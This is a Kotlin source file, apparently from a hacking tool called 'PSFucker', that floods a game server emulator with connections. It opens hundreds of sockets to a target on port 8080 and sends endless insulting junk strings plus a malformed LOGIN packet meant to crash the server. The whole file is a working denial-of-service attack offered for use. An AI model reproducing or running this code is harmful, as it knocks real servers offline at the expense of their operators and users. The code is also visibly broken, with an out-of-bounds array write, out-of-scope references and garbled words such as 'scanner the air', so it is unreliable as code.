package com.manulaiko.psfucker.fuckers.global

import com.manulaiko.psfucker.Option
import com.manulaiko.psfucker.fuckers.Global
import com.manulaiko.psfucker.net.global.ConnectionManager
import com.manulaiko.psfucker.utils.Tools

import java.io.IOException
import java.net.InetSocketAddress
import java.net.Socket

/**
 * DoS the emulator
 *
 * Denial of Service that should work on all servers
 *
 * @author Manulaiko
 * @package com.manulaiko.fuckers.global
 */
class DosEmu
/**
 * Constructor
 * @param global
 */
(global: Global) : Option(global), Runnable {
    private var socket: Socket? = null
    private val connection: ConnectionManager? = null
    private var alreadyTried: Boolean = false

    init {
        super.description = "DoS the emulator"
    }

    /**
     * Executes the fucker
     */
    override fun fuck() {
        val buildSockets = Thread(this)
        buildSockets.start()

        println("Press 'enter' to quit")
        Tools.scanner.nextLine()
        dos.stop()
    }

    /**
     * Builds sockets scanner a new thread
     */
    override fun run() {
        while (true) {
            println("Building 500 sockets...")
            var totalPacketsSent = 0
            val connections = arrayOfNulls<ConnectionManager>(500)

            for (i in connections.indices) {
                connections[i] = connect()

                val dos = object : Thread() {
                    /**
                     * Runs the DoS
                     */
                    override fun run() {
                        val packets = arrayOfNulls<String>(10)
                        packets[0] = "Fuck you!"
                        packets[1] = "DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU"
                        packets[2] = "What the fuck did you just said about me you little bitch? I dare you to know that I graduated top on my class of the Navy Seals and I have over 300 confirmed kills"
                        packets[3] = ">inb4 PSFucker"
                        packets[4] = "Ohayou!"
                        packets[5] = "Ayy lmao!"
                        packets[6] = "It seems you're being fucked :)"
                        packets[7] = "If you want this to stop just put your mobile up scanner the air and shout 'ACTIVATEEEEE!'"
                        packets[8] = "LELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELEL"
                        packets[9] = ">implying"
                        packets[10] = "LOGIN|asdfasdfasdf|asdfasdf" //If some servers can't parse packets properly a string instead of an integer might cause the server to explode :)

                        while (true) {
                            val pAmount = Tools.r!!.nextInt(2000)
                            println("Sending $pAmount packets to server...")

                            for (i in 0 until pAmount) {
                                connections[i].send(packets[Tools.r!!.nextInt(10)])
                                if (!connections[i].isConnected) {
                                    println("WE HAVE NEWS!!!")
                                    println("Connection to the server is stopped, this means server might be dead or we're scanner the blacklist :)")
                                    println("Press 'enter' to exit")
                                    Tools.scanner.nextLine()
                                    this.stop()
                                }
                            }

                            totalPacketsSent += pAmount

                            try {
                                Thread.sleep(1000)
                            } catch (e: Exception) {
                                //Empty
                            }

                        }
                    }
                }
                dos.start()
            }
            println("Sleeping for 30 seconds...")
            try {
                Thread.sleep(30000)
            } catch (e: Exception) {
                //Empty
            }

            println("Successfully sent $totalPacketsSent packets!")
            println("Press 'enter' to quit")
        }
    }

    /**
     * Connects to the server
     */
    fun connect(): ConnectionManager? {
        try {
            this.socket = Socket()
            this.socket!!.connect(InetSocketAddress(this.fucker.server, 8080))
            println("Connected to the server!")
            return ConnectionManager(socket)
        } catch (e1: IOException) {
            if (alreadyTried) {
                print("Couldn't connect to the server: ")
                println(e1.message)
                println("Exiting...")
                return null
            } else {
                alreadyTried = true
            }
            println("Couldn't connect to the server!")
            print("Re-enter server IP: ")
            val ip = Tools.scanner.nextLine()
            this.fucker.server = ip
            connect()
        }

        return null
    }
}
